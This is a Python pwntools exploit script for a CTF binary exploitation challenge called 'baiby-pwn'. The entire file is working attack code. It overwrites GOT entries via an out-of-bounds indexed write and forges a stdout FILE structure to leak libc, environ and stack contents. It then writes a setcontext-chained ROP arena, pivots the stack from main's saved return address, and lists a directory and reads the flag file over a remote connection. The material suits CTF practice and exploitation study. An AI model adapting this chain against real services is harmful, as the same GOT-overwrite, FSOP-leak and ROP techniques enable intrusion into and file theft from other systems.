#!/usr/bin/env python3
"""End-to-end exploit for BlackHat MEA Qualification CTF 2026 / baiby-pwn."""

from __future__ import annotations

import argparse
import json
import re
import sys
from pathlib import Path

from pwn import ELF, ROP, context, log, p32, p64, remote, u64


context.clear(arch="amd64", os="linux")
ROOT = Path(__file__).resolve().parent

ARR = 0x404080
STDOUT_COPY = 0x404040
LIBC_START_MAIN_GOT = 0x403FD8
STACK_CHK_FAIL_GOT = 0x404000
SETBUF_GOT = 0x404008
MEMSET_GOT = 0x404010

LOOP_HEAD = 0x401259
SETBUF_PLT_RESOLVER = 0x401040
STDOUT_CALL_SITE = 0x401231
READ_RAX_64 = 0x4011E2
LIBC_START_CALL_MAIN_RET = 0x2A1CA

SLOT_SIZE = 0x200
CONTEXT_SIZE = 0x1C8
CONTINUATION_OFFSET = 0x1D8
INLINE_DATA_OFFSET = 0x1F0
STACK_SCAN_SIZE = 0x1000

FLAG_NAME_RE = re.compile(rb"flag-[0-9a-f]{32}\.txt")
FLAG_RE = re.compile(rb"BHFlagY\{[^\r\n\x00}]+\}")


def number_field(value: int) -> bytes:
    encoded = str(value).encode()
    if len(encoded) > 7:
        raise ValueError(f"value does not fit getval(): {value}")
    return encoded.ljust(7, b" ")


def put_qword(buf: bytearray, offset: int, value: int) -> None:
    buf[offset : offset + 8] = p64(value & 0xFFFFFFFFFFFFFFFF)


class BaibyExploit:
    def __init__(self, io, libc: ELF, timeout: float):
        self.io = io
        self.libc = libc
        self.timeout = timeout

    def indexed_write(self, address: int, value: int) -> None:
        delta = address - ARR
        if delta % 8:
            raise ValueError(f"unaligned indexed write: {address:#x}")
        index = delta // 8
        self.io.send(number_field(1) + number_field(index) + number_field(value))

    def activate_primitives(self) -> None:
        self.indexed_write(STACK_CHK_FAIL_GOT, LOOP_HEAD)
        self.indexed_write(SETBUF_GOT, READ_RAX_64)
        self.indexed_write(MEMSET_GOT, STDOUT_CALL_SITE)

    @staticmethod
    def fake_stdout(address: int, size: int) -> bytes:
        # _IO_USER_BUF prevents setbuf() from freeing the forged buffer while
        # _IO_CURRENTLY_PUTTING makes it flush [write_base, write_ptr).
        values = (
            0xFBAD1801,
            address,
            address,
            address,
            address,
            address + size,
            address + size,
            address,
        )
        return b"".join(p64(value) for value in values)

    def leak(self, address: int, size: int) -> bytes:
        self.indexed_write(SETBUF_GOT, READ_RAX_64)
        self.io.send(number_field(2) + self.fake_stdout(address, size))
        self.indexed_write(SETBUF_GOT, SETBUF_PLT_RESOLVER)
        self.io.send(number_field(2))
        leaked = self.io.recvn(size, timeout=self.timeout)
        if len(leaked) != size:
            raise RuntimeError(f"short leak at {address:#x}: {len(leaked)}/{size}")
        return leaked

    def enable_raw_write(self) -> None:
        self.indexed_write(SETBUF_GOT, READ_RAX_64)

    def raw_write_64(self, address: int, data: bytes) -> None:
        if len(data) != 0x40:
            raise ValueError("raw_write_64 requires exactly 64 bytes")

        # First point stdout's COPY relocation back at itself. The following
        # raw write can then install an unrestricted 64-bit destination.
        self.indexed_write(STDOUT_COPY, STDOUT_COPY)
        self.io.send(number_field(2) + p64(address).ljust(0x40, b"\0"))
        self.io.send(number_field(2) + data)

    def raw_write_region(self, address: int, data: bytes) -> None:
        padded = data.ljust((len(data) + 0x3F) & ~0x3F, b"\0")
        for offset in range(0, len(padded), 0x40):
            self.raw_write_64(address + offset, padded[offset : offset + 0x40])


def make_context_slot(
    *,
    address: int,
    rip: int,
    continuation: bytes,
    rdi: int = 0,
    rsi: int = 0,
    rdx: int = 0,
    inline_data: bytes = b"",
) -> bytes:
    if len(continuation) > INLINE_DATA_OFFSET - CONTINUATION_OFFSET:
        raise ValueError("continuation does not fit context slot")
    if len(inline_data) > SLOT_SIZE - INLINE_DATA_OFFSET:
        raise ValueError("inline data does not fit context slot")

    slot = bytearray(SLOT_SIZE)
    put_qword(slot, 0x68, rdi)
    put_qword(slot, 0x70, rsi)
    put_qword(slot, 0x88, rdx)
    put_qword(slot, 0xA0, address + CONTINUATION_OFFSET)
    put_qword(slot, 0xA8, rip)
    put_qword(slot, 0xE0, address + 0x100)
    put_qword(slot, 0x100, 0x037F)
    slot[0x1C0 : 0x1C4] = p32(0x1F80)
    slot[CONTINUATION_OFFSET : CONTINUATION_OFFSET + len(continuation)] = continuation
    slot[INLINE_DATA_OFFSET : INLINE_DATA_OFFSET + len(inline_data)] = inline_data
    return bytes(slot)


def build_rop_arena(libc: ELF, environ: int, directory: bytes) -> tuple[int, bytes]:
    if not directory.startswith(b"/") or b"\0" in directory:
        raise ValueError("directory must be an absolute path without NUL bytes")
    if len(directory) + 1 > SLOT_SIZE - INLINE_DATA_OFFSET:
        raise ValueError("directory path is too long")

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    setcontext = libc.sym["setcontext"]

    arena = (environ & ~0xFFF) - 0x3000
    contexts = [arena + index * SLOT_SIZE for index in range(7)]
    chain = arena + len(contexts) * SLOT_SIZE
    directory_buffer = arena + 0x1000
    path_buffer = arena + 0x1400
    file_buffer = arena + 0x1500
    root_path = contexts[0] + INLINE_DATA_OFFSET

    functions = (
        (libc.sym["open"], root_path, 0x10000, 0),
        (libc.sym["getdents64"], 3, directory_buffer, 0x400),
        (libc.sym["write"], 1, directory_buffer, 0x400),
        (libc.sym["read"], 0, path_buffer, 0x40),
        (libc.sym["open"], path_buffer, 0, 0),
        (libc.sym["read"], 4, file_buffer, 0x100),
        (libc.sym["write"], 1, file_buffer, 0x100),
    )

    arena_data = bytearray(0xE40)
    for index, (rip, rdi, rsi, rdx) in enumerate(functions):
        if index + 1 < len(contexts):
            continuation = p64(pop_rdi) + p64(contexts[index + 1]) + p64(setcontext)
        else:
            continuation = p64(pop_rdi) + p64(0) + p64(libc.sym["_exit"])
        inline = directory + b"\0" if index == 0 else b""
        slot = make_context_slot(
            address=contexts[index],
            rip=rip,
            continuation=continuation,
            rdi=rdi,
            rsi=rsi,
            rdx=rdx,
            inline_data=inline,
        )
        offset = contexts[index] - arena
        arena_data[offset : offset + SLOT_SIZE] = slot

    arena_data[chain - arena : chain - arena + 24] = (
        p64(pop_rdi) + p64(contexts[0]) + p64(setcontext)
    )
    return chain, bytes(arena_data)


def exploit(args: argparse.Namespace) -> bytes:
    libc = ELF(args.libc, checksec=False)
    io = remote(args.host, args.port, timeout=args.timeout)
    attack = BaibyExploit(io, libc, args.timeout)

    try:
        attack.activate_primitives()

        libc_start_main = u64(attack.leak(LIBC_START_MAIN_GOT, 8))
        libc.address = libc_start_main - libc.sym["__libc_start_main"]
        log.success("libc base: %#x", libc.address)

        environ = u64(attack.leak(libc.sym["__environ"], 8))
        log.success("environ: %#x", environ)

        scan_start = environ - STACK_SCAN_SIZE
        stack = attack.leak(scan_start, STACK_SCAN_SIZE)
        return_address = p64(libc.address + LIBC_START_CALL_MAIN_RET)
        return_offset = stack.rfind(return_address)
        if return_offset < 0:
            raise RuntimeError("main return address not found in stack scan")
        saved_rip = scan_start + return_offset
        log.success("main saved RIP: %#x", saved_rip)

        chain, arena_data = build_rop_arena(libc, environ, args.directory.encode())
        attack.enable_raw_write()
        attack.raw_write_region(chain - 7 * SLOT_SIZE, arena_data)

        pop_rsp = ROP(libc).find_gadget(["pop rsp", "ret"]).address
        attack.raw_write_64(saved_rip, (p64(pop_rsp) + p64(chain)).ljust(0x40, b"\0"))

        # Return from main into the stack pivot. The ROP chain first lists the
        # selected directory, then blocks in read(0, path_buffer, 0x40).
        io.send(number_field(0))
        listing = io.recvn(0x400, timeout=args.timeout)
        if len(listing) != 0x400:
            raise RuntimeError(f"short directory listing: {len(listing)}/1024")

        if args.test_path:
            flag_path = args.test_path.encode()
        else:
            match = FLAG_NAME_RE.search(listing)
            if not match:
                raise RuntimeError("flag filename not found in directory listing")
            prefix = args.directory.rstrip("/")
            flag_path = ((prefix or "") + "/").encode() + match.group(0)
        if len(flag_path) >= 0x40:
            raise RuntimeError("flag path does not fit the staged read")
        log.success("target path: %s", flag_path.decode())

        io.send(flag_path.ljust(0x40, b"\0"))
        result = io.recvn(0x100, timeout=args.timeout)
        if len(result) != 0x100:
            raise RuntimeError(f"short file output: {len(result)}/256")
        return result
    finally:
        io.close()


def parse_args() -> argparse.Namespace:
    instance = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in instance["endpoints"] if item["name"] == "main")
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=endpoint["host"])
    parser.add_argument("--port", default=endpoint["port"], type=int)
    parser.add_argument("--libc", default=ROOT / "output" / "support" / "libc.so.6")
    parser.add_argument("--directory", default="/")
    parser.add_argument("--test-path")
    parser.add_argument("--timeout", default=5.0, type=float)
    parser.add_argument("--debug", action="store_true")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    context.log_level = "debug" if args.debug else "error"
    result = exploit(args)
    if args.test_path:
        print(result.rstrip(b"\0").decode(errors="replace"))
        return 0
    match = FLAG_RE.search(result)
    if not match:
        raise RuntimeError("flag not found in file output")
    sys.stdout.buffer.write(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
